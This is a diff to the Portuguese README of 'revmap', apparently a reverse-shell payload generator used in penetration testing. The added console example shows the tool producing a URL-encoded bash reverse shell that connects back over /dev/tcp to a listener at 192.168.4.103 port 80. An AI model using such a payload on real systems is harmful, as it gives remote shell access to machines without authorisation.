@@ -56,6 +56,21 @@ pip3 install revmap
 
 # Executando revmap
 
-![logo_do_projeto](https://github.com/joaoviictorti/revmap/blob/main/images/revmap_console.png)
+```console
+revmap --ip 192.168.4.103 --port 80
+ ___ ___ _ _ _____ ___ ___
+|  _| -_| | |     | .'| . |
+|_| |___|\_/|_|_|_|__,|  _|
+                      |_|
+        v0.0.8 - @joaoviictorti
+
+[tab] for commands suggestions
+192.168.4.103 (80) [revmap] # bash
+Do you want to use encoding?  (Yes/No) [revmap] # yes
+Insert encode [revmap] # urlencode
+bash%20-c%20%27exec%20bash%20-i%20%26%3E/dev/tcp/192.168.4.103/80%20%3C%261%27
+192.168.4.103 (80) [revmap] #
+
+```
 
 <img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=footer"/>
